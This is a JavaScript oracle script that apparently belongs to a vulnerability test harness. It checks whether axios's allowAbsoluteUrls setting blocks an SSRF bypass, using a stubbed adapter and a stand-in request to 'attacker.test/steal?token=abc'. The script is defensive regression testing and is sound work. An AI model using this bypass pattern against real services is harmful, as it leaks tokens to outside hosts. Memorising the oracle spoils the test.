const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  try {
    const marker = `axios-ssrf-regression-${process.pid}-${Date.now()}`;
    const tmpRoot = path.join(os.tmpdir(), marker);
    fs.mkdirSync(tmpRoot, { recursive: true });
    const markerFile = path.join(tmpRoot, 'marker.txt');
    fs.writeFileSync(markerFile, 'oracle');

    const axiosImport = require('axios');
    const axios = axiosImport && axiosImport.default ? axiosImport.default : axiosImport;

    // Benign operation: ordinary relative URL request should succeed.
    let benignObservedUrl = '';
    try {
      const benignResp = await axios.get('/health', {
        baseURL: 'http://example.test/api/',
        adapter: async (config) => {
          benignObservedUrl = String((config && config.url) || '');
          return {
            data: { ok: true },
            status: 200,
            statusText: 'OK',
            headers: {},
            config,
            request: { oracle: true }
          };
        }
      });

      if (!benignResp || benignResp.status !== 200) {
        throw new Error('benign_non_200');
      }
      if (!benignObservedUrl) {
        throw new Error('benign_missing_url');
      }
    } catch (e) {
      const msg = String((e && e.message) || e);
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: `benign_failed:${msg.slice(0, 200)}`
      }));
      return;
    }

    operation_completed = true;

    // Malicious operation: absolute URL should be blocked when allowAbsoluteUrls is false.
    // CVE-style behavior in vulnerable versions: request is still sent to attacker origin.
    const target = axios.create({
      baseURL: 'http://example.test/api/',
      allowAbsoluteUrls: false
    });

    let sawRequest = false;
    let resolvedUrl = '';
    let parsedHost = '';

    try {
      await target.get('http://attacker.test/steal?token=abc', {
        adapter: async (config) => {
          sawRequest = true;
          const u = String((config && config.url) || '');
          resolvedUrl = u;
          try {
            const abs = new URL(u, 'http://example.test');
            parsedHost = abs.host;
          } catch (_) {
            parsedHost = 'unparseable';
          }
          return {
            data: { ok: true },
            status: 200,
            statusText: 'OK',
            headers: {},
            config,
            request: { oracle: true }
          };
        }
      });
    } catch (e) {
      const msg = String((e && e.message) || e);
      evidence = `benign_url=${benignObservedUrl};malicious_error=${msg.slice(0, 200)};marker=${markerFile};`;
      exploit_succeeded = false;
      console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
      return;
    }

    // If attacker host survives normalization/routing, SSRF control bypass succeeded.
    const attackerHostSeen = parsedHost === 'attacker.test' || /attacker\.test/i.test(resolvedUrl);
    exploit_succeeded = Boolean(sawRequest && attackerHostSeen);

    evidence = `benign_url=${benignObservedUrl};malicious_url=${resolvedUrl};parsed_host=${parsedHost};adapter_called=${sawRequest};marker=${markerFile};`;
    console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
  } catch (e) {
    const msg = String((e && e.message) || e);
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: `setup_or_runtime_error:${msg.slice(0, 200)}`
    }));
  }
})();